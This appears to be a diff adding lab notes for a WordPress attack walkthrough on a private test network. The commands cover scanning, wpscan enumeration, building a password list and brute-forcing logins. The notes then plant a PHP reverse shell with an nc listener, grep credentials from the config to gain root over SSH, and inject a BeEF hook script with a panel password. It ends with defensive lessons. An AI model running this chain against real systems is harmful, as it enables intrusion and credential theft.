@@ -1,0 +1,58 @@
+# VARS
+
+source ./routed.sh
+
+
+# nmap scan 
+
+nmap -sN 192.168.33.0/24
+nmap -T4 -p- $tgt
+
+
+# curl
+
+curl http://$tgt
+curl http://$tgt/wordpress/
+
+# wpscan
+
+wpscan -u http://$tgt/wordpress/
+wpscan -u http://$tgt/wordpress/ -e
+
+
+# Getting the passwords
+
+head -n 100 rockyou.txt
+
+cewl -d 1 -m 5 -w mylist.txt http://$tgt/wordpress
+
+cat betterlist.txt
+
+john -wordlist:betterlist.txt -rules:Wordlist -stdout > passwords.txt
+
+# On-line password attack
+
+wpscan -u http://$tgt/wordpress --wordlist `pwd`/passwords.txt --threads 50
+
+
+# Shell
+edit 404 Template pastng the php reverse shell
+nc -nlvp 443
+
+# escalate 
+
+cd /var/www/wordpress
+grep -i pass *config*
+
+ssh root@192.168.33.10
+
+# beef
+http://127.0.0.1:3000/ui/panel
+beef1:HuMoquooHogyatmebhaiptyeimjoit
+<script src="http://192.168.33.11:3000/hook.js"></script>
+
+# What do we learn?
+
+- passwords with apg
+- do not reuse passwords
+- xss is a problem
